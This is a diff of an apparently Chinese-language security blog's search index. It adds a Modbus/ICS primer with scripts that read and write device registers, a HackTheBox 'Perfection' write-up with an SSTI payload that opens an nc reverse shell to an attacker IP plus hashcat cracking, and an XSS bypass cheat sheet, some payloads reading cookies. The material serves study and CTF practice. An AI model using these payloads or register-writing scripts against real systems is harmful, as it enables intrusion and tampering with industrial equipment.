@@ -1581,6 +1581,103 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>初探 ISC Security - Modbus</title>
+    <url>/2024/06/30/mfics-modbus/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>今天心血來潮研究了一下工業控制和Modbusㄉ東西，最後在github上寫了個小專案，歡迎來玩玩 &gt;&lt;<br><a href="https://github.com/William957-web/modbus_weather_station_lab">https://github.com/William957-web/modbus_weather_station_lab</a>  </p>
+<p><strong>References:</strong><br><a href="https://www.csimn.com/CSI_pages/Modbus101.html">https://www.csimn.com/CSI_pages&#x2F;Modbus101.html</a>  </p>
+<p><a href="https://pymodbus.readthedocs.io/en/latest/source/client.html">https://pymodbus.readthedocs.io/en/latest/source/client.html</a>  </p>
+<p>P.S. TryHackMe上面的 Attacking ICS Plant系列推薦去打打看  </p>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><h3 id="工控名詞"><a href="#工控名詞" class="headerlink" title="工控名詞"></a>工控名詞</h3><p>所謂的工控，就是工業控制(?)<br><del>好像很明確了</del><br>看幾個常見名詞  </p>
+<ol>
+<li>Operational Technology, OT  </li>
+<li>Industrial Control System, ICS  </li>
+<li>Programmable Logic Controller, PLC  </li>
+<li>Supervisor Control And Data Acqusition, SCADA  </li>
+<li>Distributed Control System, DCS  </li>
+<li>Human Machine Interaction, HMI</li>
+</ol>
+<p>簡單來說，OT就是操作技術的大圈圈，而ICS就是今天的主角工業控制<br>工業控制裡面大致上又可以分為 PLC (邏輯控制的程式)、SCADA(可監控和控制的系統)、DCS (分散式的控制系統)以及 HMI(人機互動的部分)  </p>
+<p><strong>SCADA v.s. DCS</strong><br>相較之下，通常DCS更注重於控制，而SCADA則注重監測<br>而SCADA也較為靈活，但並沒有絕對的優缺比較，而兩者本質上是出於相同目的的。  </p>
+<p>詳細更多內容請參考：<a href="https://blog.digiinfr.com/dcs%E5%92%8Cscada%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/">https://blog.digiinfr.com/dcs%E5%92%8Cscada%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</a></p>
+<p>最後，DCS, SCADA會用到PLC，本身也會被HMI去做實體化，而PLC就是接收SENSOR跟呼叫ACTUATORS，所以它們之間的關係圖大概長這樣：<br><img src="https://hackmd.io/_uploads/rJT3qkkvA.png" alt="image">  </p>
+<p>P.S. 在正式部署前的測試環境叫做testbed  </p>
+<h3 id="modbus-protocol"><a href="#modbus-protocol" class="headerlink" title="modbus protocol"></a>modbus protocol</h3><p>工業控制有很多種 protocol，modbus就是常用的其中一種！<br>這些protocol的目的是在工控環境下傳遞正確的資訊，讓工廠有正確的操作。  </p>
+<p>再來是 modbus 的簡介：<br>本體是基於RTU over RS-485(實體層)，而遠端呼叫時modbus是透過tcp傳送的，也是後續lab採用的方法(容易被打的地方)。<br>modbus協議定義了主從(master&#x2F;slave)的關係，必須有個master以及一個以上的slave去接收&#x2F;回顯訊息。  </p>
+<p>每個 modbus 的封包都必須包含一個 function code 以及要呼叫的變量(?)以及值  </p>
+<p>Function Code Table  </p>
+<table>
+<thead>
+<tr>
+<th>Function Code</th>
+<th>Register Type</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Read Coil</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Read Discrete Input</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Read Holding Registers</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Read Input Registers</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Write Single Coil</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Write Single Holding Register</td>
+</tr>
+<tr>
+<td>15</td>
+<td>Write Multiple Coils</td>
+</tr>
+<tr>
+<td>16</td>
+<td>Write Multiple Holding Registers</td>
+</tr>
+</tbody></table>
+<p>變量分為這三種：  </p>
+<ul>
+<li>Discrete Input : 1 bit, read only</li>
+<li>Coil : 1 bit, read&#x2F;write</li>
+<li>Input Registers : 16 bits, read only</li>
+<li>Holding Registers : 16 bits, read&#x2F;write</li>
+</ul>
+<p>傳遞時封包列起來會像這樣：<br>(Read Holding Registers)<br><img src="https://hackmd.io/_uploads/SJER_lJwA.png" alt="image"><br>(Write Single Holding Register)<br><img src="https://hackmd.io/_uploads/ryGlKx1wA.png" alt="image">  </p>
+<p>會看到有個 Func 的選項，就是丟出去的 function code，modbus段就是丟出去的參數們  </p>
+<h3 id="Python-Implementation"><a href="#Python-Implementation" class="headerlink" title="Python Implementation"></a>Python Implementation</h3><p>以我做的 <a href="https://github.com/William957-web/modbus_weather_station_lab">lab</a> 為範例  </p>
+<p>安裝 python modbus 庫，就包含server端跟client端ㄌ  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pip3 install pymodbus==<span class="number">2.5</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
+<p>p.s. 以前版本限制沒那麼多，我是用這個  </p>
+<h4 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h4><p><strong>attack&#x2F;recon.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pymodbus.client.sync <span class="keyword">import</span> ModbusTcpClient <span class="keyword">as</span> ModbusClient</span><br><span class="line"><span class="keyword">from</span> pymodbus.exceptions <span class="keyword">import</span> ConnectionException</span><br><span class="line"></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">client = ModbusClient(ip, port=<span class="number">502</span>)</span><br><span class="line">client.connect()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    rr = client.read_holding_registers(<span class="number">1</span>, <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(rr.registers)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>利用<code>ModbusClient</code>建立連線，以<code>read_holding_registers</code>去閱讀<code>Holding Register</code>，就是func code 3的呼叫<br><strong>attack&#x2F;set_register.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pymodbus.client.sync <span class="keyword">import</span> ModbusTcpClient <span class="keyword">as</span> ModbusClient</span><br><span class="line"><span class="keyword">from</span> pymodbus.exceptions <span class="keyword">import</span> ConnectionException</span><br><span class="line"></span><br><span class="line">ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">registry = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">value = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">client = ModbusClient(ip, port=<span class="number">502</span>)</span><br><span class="line">client.connect()</span><br><span class="line">client.write_register(registry, value)</span><br></pre></td></tr></table></figure>
+<p>跟剛剛很像，以<code>write_register</code>去寫入register  </p>
+<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p><strong>station.py</strong></p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymodbus.server.sync <span class="keyword">import</span> StartTcpServer</span><br><span class="line"><span class="keyword">from</span> pymodbus.datastore <span class="keyword">import</span> ModbusSequentialDataBlock</span><br><span class="line"><span class="keyword">from</span> pymodbus.datastore <span class="keyword">import</span> ModbusSlaveContext, ModbusServerContext</span><br><span class="line"><span class="keyword">from</span> pymodbus.device <span class="keyword">import</span> ModbusDeviceIdentification</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">online = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_registers</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        slave_id = <span class="number">0x00</span></span><br><span class="line">        address = <span class="number">0x01</span></span><br><span class="line"></span><br><span class="line">        temperature = random.randint(<span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line">        pressure = random.randint(<span class="number">1000</span>, <span class="number">1100</span>)</span><br><span class="line">        humidity = random.randint(<span class="number">30</span>, <span class="number">50</span>)</span><br><span class="line">        context[slave_id].setValues(<span class="number">3</span>, address, [temperature])</span><br><span class="line">        context[slave_id].setValues(<span class="number">3</span>, address + <span class="number">1</span>, [pressure])</span><br><span class="line">        context[slave_id].setValues(<span class="number">3</span>, address + <span class="number">2</span>, [humidity])</span><br><span class="line">        context[slave_id].setValues(<span class="number">3</span>, address + <span class="number">15</span>, [online])</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Data storage</span></span><br><span class="line">store = ModbusSlaveContext(</span><br><span class="line">    hr=ModbusSequentialDataBlock(<span class="number">0</span>, [<span class="number">0</span>]*<span class="number">100</span>)</span><br><span class="line">)</span><br><span class="line">context = ModbusServerContext(slaves=store, single=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine Configurations</span></span><br><span class="line">identity = ModbusDeviceIdentification()</span><br><span class="line">identity.VendorName = <span class="string">&#x27;pymodbus&#x27;</span></span><br><span class="line">identity.ProductCode = <span class="string">&#x27;PM&#x27;</span></span><br><span class="line">identity.VendorUrl = <span class="string">&#x27;http://github.com/riptideio/pymodbus/&#x27;</span></span><br><span class="line">identity.ProductName = <span class="string">&#x27;pymodbus Server&#x27;</span></span><br><span class="line">identity.ModelName = <span class="string">&#x27;pymodbus Server&#x27;</span></span><br><span class="line">identity.MajorMinorRevision = <span class="string">&#x27;1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Multi Threadings</span></span><br><span class="line">update_thread = threading.Thread(target=update_registers, args=(context,))</span><br><span class="line">update_thread.daemon = <span class="literal">True</span></span><br><span class="line">update_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modbus TCP Server</span></span><br><span class="line">StartTcpServer(context, identity=identity, address=(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">502</span>))</span><br></pre></td></tr></table></figure>
+<p>這段程式碼建立了一百個初始值為0的data block</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">store = ModbusSlaveContext(</span><br><span class="line">    hr=ModbusSequentialDataBlock(<span class="number">0</span>, [<span class="number">0</span>]*<span class="number">100</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>接著以<code>context = ModbusServerContext(slaves=store, single=True)</code><br>建立一個 modbus server(slave資料就是剛剛的datablock)<br>函數<code>update_registers</code>裡面的<code>setValues</code>則是去改 register 值。  </p>
+<p>大致上就是這些啦~  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>工控其實挺有趣的，之前在HTB也有打過抽換惡意PLC彈rev shell的題目，之後可以多碰碰<br>但要先處理資格考…🐳  </p>
+]]></content>
+      <tags>
+        <tag>OT</tag>
+        <tag>ISC</tag>
+        <tag>modbus</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Mr.Robot CTF Writeup on TryHackMe</title>
     <url>/2023/11/10/mrrobotctf/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>This was a fun one and I learned a lot.<br>But I don’t like such a big dictionary file which would cause a long term brute forcing ……  </p>
@@ -1674,44 +1771,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Note</tag>
         <tag>msfconsole</tag>
         <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Perfection Write Up on HackTheBox</title>
-    <url>/2024/04/07/perfection-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.253<br>卡在一開始的Ruby Rails的SSTI&#x3D; &#x3D;<br><del>菜，就多練</del>  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.253 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/rywbXqyg0.png" alt="image"><br>老樣子 &#x3D; &#x3D;  </p>
-<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/S1id751eA.png" alt="image"><br>沒有什麼特別的東西…  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="web-exploitation"><a href="#web-exploitation" class="headerlink" title="web exploitation"></a>web exploitation</h4><p>在web的footer發現WEBrick 1.7.0的使用：<br><img src="https://hackmd.io/_uploads/BJoim91eA.png" alt="image"><br>合理推測是Ruby的網站  </p>
-<p>嘗試使用 exploit-db 上面關於WEBrick的CVE，不過都沒用  </p>
-<p><img src="https://hackmd.io/_uploads/Sy9xNqJlR.png" alt="image">  </p>
-<p>有個路徑<code>/weighted-grade-calc</code>，是一個簡單的分數加權計算程式  </p>
-<p><img src="https://hackmd.io/_uploads/rkJK49ylR.png" alt="image">  </p>
-<p>按下送出後的結果：  </p>
-<p><img src="https://hackmd.io/_uploads/HJzcEqkxR.png" alt="image">  </p>
-<p>嘗試使用COMMAND INJECTION之類的不過都無果，會有警告跳出來：  </p>
-<p><img src="https://hackmd.io/_uploads/r1jh491xR.png" alt="image">  </p>
-<p>然後我就卡住了 :D  </p>
-<p>最後偷喵了別人的write-up:<a href="https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224">https:&#x2F;&#x2F;medium.com&#x2F;@andrewss112&#x2F;hackthebox-perfection-49ab3e6ac224</a><br>原來要用 <code>%0A</code> 繞過檢查 + Ruby Rails SSTI啊!!!<br>Final Payload:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">category1=x%0A%3C%25%3D%20system%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.46%201004%20%3E%2Ftmp%2Ff%22%29%3B%20%25%3E&amp;grade1=100&amp;weight1=30&amp;category2=HACKING&amp;grade2=80&amp;weight2=10&amp;category3=thinking&amp;grade3=80&amp;weight3=10&amp;category4=meow&amp;grade4=97&amp;weight4=25&amp;category5=77&amp;grade5=77&amp;weight5=25</span><br></pre></td></tr></table></figure>
-<p>註：SSTI的payload：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.46 1004 &gt;/tmp/f&quot;); %&gt;</span><br></pre></td></tr></table></figure>
-<p>開彈reverse shell<br><img src="https://hackmd.io/_uploads/HkiFS9yxC.png" alt="image"><br>成功!!!  </p>
-<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>在本地port 8089架python http server<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8089</span><br></pre></td></tr></table></figure>
-<p>然後從機器抓小豌豆進去<br><img src="https://hackmd.io/_uploads/HyFzIckeA.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/H1UQI91gC.png" alt="image">  </p>
-<p><code>sudo</code>可以讓我打到變成root，所以要找到使用者密碼。<br>在本地有個檔案<code>Migration/pupilpath_credentials.db</code>，找到一個密碼，那很可能就是susan在機器上的密碼。<br><img src="https://hackmd.io/_uploads/r1Pq8c1x0.png" alt="image"><br>結合linpeas發現的可疑email檔案<img src="https://hackmd.io/_uploads/HJ6p8cyx0.png" alt="image"><br>找到密碼格式。<br><img src="https://hackmd.io/_uploads/HycRU9kxR.png" alt="image"><br>利用這些資訊配合hashcat進行密碼爆破：<br><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -m 1400  pass -a 3 <span class="string">&#x27;susan_nasus_?d?d?d?d?d?d?d?d?d&#x27;</span> -t 64</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HJczP9yxA.png" alt="image"><br>找到密碼<code>susan_nasus_413759210</code>！<br><img src="https://hackmd.io/_uploads/HJ04Oqyg0.png" alt="image"><br>最後成為<code>root</code>  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>我下午484應該挑一台Medium打打看(?)  </p>
-<p>附上比hashcat慢一點的python作法<br><img src="https://hackmd.io/_uploads/BJtPOq1gA.png" alt="image">  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1857,6 +1916,44 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>picoCTF</tag>
         <tag>Pollard p-1</tag>
         <tag>Smooth Prime</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Perfection Write Up on HackTheBox</title>
+    <url>/2024/04/07/perfection-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Attacker’s IP : 10.10.14.46<br>Victim’s IP : 10.10.11.253<br>卡在一開始的Ruby Rails的SSTI&#x3D; &#x3D;<br><del>菜，就多練</del>  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.253 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/rywbXqyg0.png" alt="image"><br>老樣子 &#x3D; &#x3D;  </p>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/S1id751eA.png" alt="image"><br>沒有什麼特別的東西…  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="web-exploitation"><a href="#web-exploitation" class="headerlink" title="web exploitation"></a>web exploitation</h4><p>在web的footer發現WEBrick 1.7.0的使用：<br><img src="https://hackmd.io/_uploads/BJoim91eA.png" alt="image"><br>合理推測是Ruby的網站  </p>
+<p>嘗試使用 exploit-db 上面關於WEBrick的CVE，不過都沒用  </p>
+<p><img src="https://hackmd.io/_uploads/Sy9xNqJlR.png" alt="image">  </p>
+<p>有個路徑<code>/weighted-grade-calc</code>，是一個簡單的分數加權計算程式  </p>
+<p><img src="https://hackmd.io/_uploads/rkJK49ylR.png" alt="image">  </p>
+<p>按下送出後的結果：  </p>
+<p><img src="https://hackmd.io/_uploads/HJzcEqkxR.png" alt="image">  </p>
+<p>嘗試使用COMMAND INJECTION之類的不過都無果，會有警告跳出來：  </p>
+<p><img src="https://hackmd.io/_uploads/r1jh491xR.png" alt="image">  </p>
+<p>然後我就卡住了 :D  </p>
+<p>最後偷喵了別人的write-up:<a href="https://medium.com/@andrewss112/hackthebox-perfection-49ab3e6ac224">https:&#x2F;&#x2F;medium.com&#x2F;@andrewss112&#x2F;hackthebox-perfection-49ab3e6ac224</a><br>原來要用 <code>%0A</code> 繞過檢查 + Ruby Rails SSTI啊!!!<br>Final Payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">category1=x%0A%3C%25%3D%20system%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.46%201004%20%3E%2Ftmp%2Ff%22%29%3B%20%25%3E&amp;grade1=100&amp;weight1=30&amp;category2=HACKING&amp;grade2=80&amp;weight2=10&amp;category3=thinking&amp;grade3=80&amp;weight3=10&amp;category4=meow&amp;grade4=97&amp;weight4=25&amp;category5=77&amp;grade5=77&amp;weight5=25</span><br></pre></td></tr></table></figure>
+<p>註：SSTI的payload：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%= system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.46 1004 &gt;/tmp/f&quot;); %&gt;</span><br></pre></td></tr></table></figure>
+<p>開彈reverse shell<br><img src="https://hackmd.io/_uploads/HkiFS9yxC.png" alt="image"><br>成功!!!  </p>
+<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="password-cracking"><a href="#password-cracking" class="headerlink" title="password cracking"></a>password cracking</h4><p>在本地port 8089架python http server<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8089</span><br></pre></td></tr></table></figure>
+<p>然後從機器抓小豌豆進去<br><img src="https://hackmd.io/_uploads/HyFzIckeA.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/H1UQI91gC.png" alt="image">  </p>
+<p><code>sudo</code>可以讓我打到變成root，所以要找到使用者密碼。<br>在本地有個檔案<code>Migration/pupilpath_credentials.db</code>，找到一個密碼，那很可能就是susan在機器上的密碼。<br><img src="https://hackmd.io/_uploads/r1Pq8c1x0.png" alt="image"><br>結合linpeas發現的可疑email檔案<img src="https://hackmd.io/_uploads/HJ6p8cyx0.png" alt="image"><br>找到密碼格式。<br><img src="https://hackmd.io/_uploads/HycRU9kxR.png" alt="image"><br>利用這些資訊配合hashcat進行密碼爆破：<br><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat  -m 1400  pass -a 3 <span class="string">&#x27;susan_nasus_?d?d?d?d?d?d?d?d?d&#x27;</span> -t 64</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJczP9yxA.png" alt="image"><br>找到密碼<code>susan_nasus_413759210</code>！<br><img src="https://hackmd.io/_uploads/HJ04Oqyg0.png" alt="image"><br>最後成為<code>root</code>  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>我下午484應該挑一台Medium打打看(?)  </p>
+<p>附上比hashcat慢一點的python作法<br><img src="https://hackmd.io/_uploads/BJtPOq1gA.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -2522,6 +2619,38 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>XSS Note</title>
+    <url>/2023/12/23/xss-note/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：<br><a href="https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss">Port Swigger</a><br>p.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;  </p>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><h3 id="Basic-Payloads"><a href="#Basic-Payloads" class="headerlink" title="Basic Payloads:"></a>Basic Payloads:</h3><p>來複習一下(～￣▽￣)～<br><strong>For HTML:</strong>  </p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span></span><br><span class="line">&#x27;;-alert(1)-;&#x27;</span><br><span class="line">blablalba</span><br></pre></td></tr></table></figure>
+<p><strong>Javascript Injection:</strong>  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);\\</span></span><br><span class="line"><span class="string">blablabla</span></span><br></pre></td></tr></table></figure>
+<p><strong>DOM Base:</strong><br>是觸發於<code>document.write</code>這類寫入函數的弱點。<br>開啟Burp Suite Browser的f12工具列，找到DOM Invader，搜尋自己的input然後構造payload，後面就跟前面一樣ㄌ  </p>
+<h3 id="HTML-Encode-Trick"><a href="#HTML-Encode-Trick" class="headerlink" title="HTML Encode Trick"></a>HTML Encode Trick</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">apos;-<span class="title function_">alert</span>(<span class="number">1</span>)-&amp;apos;</span><br></pre></td></tr></table></figure>
+<h3 id="Angular-js"><a href="#Angular-js" class="headerlink" title="Angular js"></a>Angular js</h3><p>Angular js 會去抓取格式如<code>&#123;&#123;&#125;&#125;</code>的東西當作模板去做處理，就跟SSTI一樣。<br><strong>Payloads</strong><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">Angular js SSTI Payloads on Github</a>  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;&#123;$on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Blocked-html-tags"><a href="#Blocked-html-tags" class="headerlink" title="Blocked html tags"></a>Blocked html tags</h3><p>第一個想法一定是暴力看看有那些tags和arguments可以用<br><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Payload List on Port Swigger</a><br>如果都不行的話，構造一個不存在的tag然後利用id+onfocus以及url fragment(<code>#</code>)去觸發XSS：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;xss+id=x+onfocus=<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) tabindex=<span class="number">1</span>&gt;#x<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Backtick-Injection"><a href="#Backtick-Injection" class="headerlink" title="Backtick Injection"></a>Backtick Injection</h3><p>透過使用如<code>$&#123;&#125;</code>的方式去呼叫js，一樣是一種SSTI(?)</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="XML-attributeName"><a href="#XML-attributeName" class="headerlink" title="XML attributeName"></a>XML attributeName</h3><p>利用XML attributeName去改掉父標籤屬性。  </p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;animate+attributeName=href+values=javascript:alert(1)+/&gt;&lt;text+x=20+y=20&gt;Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="js-throw"><a href="#js-throw" class="headerlink" title="js throw"></a>js throw</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">lab</a>  </p>
+<ul>
+<li>利用資料解析方式的不同去觸發injection</li>
+</ul>
+<p>throw+onerror可以觸發一系列行為。  </p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span>&amp;<span class="string">&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;</span><span class="string">&#x27;,&#123;x:&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>應該還有些東西要補(  </p>
+]]></content>
+      <tags>
+        <tag>Web Security</tag>
+        <tag>XSS</tag>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WifineticTwo Write Up on HackTheBox</title>
     <url>/2024/04/07/wifinetic2-htb/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>不知道為什麼我的OneShot後來要重打進去之後就掛ㄌ…<br><del>反正絕對不是被我玩壞了</del>  </p>
